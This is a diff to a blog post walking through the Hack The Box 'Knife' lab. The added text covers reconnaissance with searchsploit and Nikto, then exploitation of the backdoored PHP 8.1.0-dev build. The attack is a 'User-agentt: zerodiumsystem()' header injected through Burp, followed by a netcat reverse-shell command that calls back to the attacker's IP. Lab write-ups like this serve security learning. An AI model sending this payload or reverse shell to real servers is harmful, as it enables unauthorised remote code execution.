@@ -86,8 +86,47 @@ searchsploit httpd | grep linux
 searchsploit openSSH
 `````
 
-There are some existing exploits but they don't look promising: it's either not for the good version or not what we want (there are DoS, buffer overflows, ...).
+There are some existing exploits but they don't look very promising: it's either not for the good version or not what we want (DoS, buffer overflows, ...). We can also inspect the webpage to see if we find information about php (we saw *index.php* in the output of dirb) or any other useful information. We can simply right-click on the page and clickc on *inspect element*. Then we can look at the different tabs, see what kind of php scripts there are, inspect the trafficc between the server and our client, and so on... Sadly, there is nothing there either.\\
+
+I'm not used to it, but we could try to use **Nikto**. This tool allows to scan a web server to detect potential vulnerabilities:
+
+<div class="img_container">
+![nikto]({{https://jsom1.github.io/}}/_images/htb_knife_nikto.png)
+</div>
+
+We see the version of php, which is 8.1.0-dev. Th fact that it's a dev version means that it could be vulnerable somehow. We'll search for vulnerabilities for this version, but first let's look at what CGII directories are. It didn't find any, but I don't know what it is so here's a shot description: cgi-bin ("Commom Gateway Interface") is a directory that contains stored Perl or compiled files. Those files are treated as programs instead of HTML pages or images, and will be run by the server instead of displayed normally. In short, it's an interface used by HTTP servers.\\
+
+Simply Googling "php 8.1.0-dev exploit" returns many pages which mention a **backdoor remote command injection**. That might finally be our way in!\\
+Apparently, the version 8.1.0-dev was released with a backdoor on March 28th, 2021. Someone was able to push two malicious commits into the php-src-repo. They were quickly discovered and removed, but might still be present if the version wasn't patched.
+
+The exploit consists in adding a new header *"User-agentt":"zerodiumsystem();"* (yes with two "t"). We can issue a command in the *zerodiumsystem()* part, for example *zerodiumsystem('ls')* to list files and directories.\\
+A well known tool to tamper a request if Burp, and we can use it to check if it works. We fist make sure the proxy is configured: in the browser, we go to *Preferences* -> *Network Settings* -> *Settings* and tick *Manual proxy configuration*. We set the value of HTTP Proxy to 127.0.0.1 and the port to 8080.\\
+We can then open Burp and refresh the webpage in the browser. Burp should intercept the request, and we can modify it as follows:
+
+<div class="img_container">
+![burp]({{https://jsom1.github.io/}}/_images/htb_knife_burp1.png)
+</div>
+
+Once we added the malicious header, we can forward the request. The server processes it and responds to us. We can analyze the response to see if it worked:
+
+<div class="img_container">
+![burp]({{https://jsom1.github.io/}}/_images/htb_knife_burp2.png)
+</div>
+
+The server indeed returned the output of the *ls* command, proving we have remote code execution! Let's see if we can get a reverse shell... We start by looking at our ip (*sudo ifconfig tun0*). We then start a listener on port 4444 (*sudo nc -nlvp 4444*) and replace the *ls* command with *nc -nv 10.10.14.6 4444*:
+
+<div class="img_container">
+![burp]({{https://jsom1.github.io/}}/_images/htb_knife_burp3.png)
+</div>
+
+We forward the packet and see if the server connects back to us:
+
+<div class="img_container">
+![revshell]({{https://jsom1.github.io/}}/_images/htb_knife_revsh.png)
+</div>
+
+It does indeed, but the shell is not responsive... There could be another way to get the user flag: we can issue hostname, and then write a command to read the file in the user's home. We start by getting the hostname:
 
 <ins>**My thoughts**</ins>
-
+Although only 2 ports, not smth that stands out. Feels more like a real life scenario. Normalement 10000 trucs à try, ici l'inverse, struggle pour trouver un truc.
 
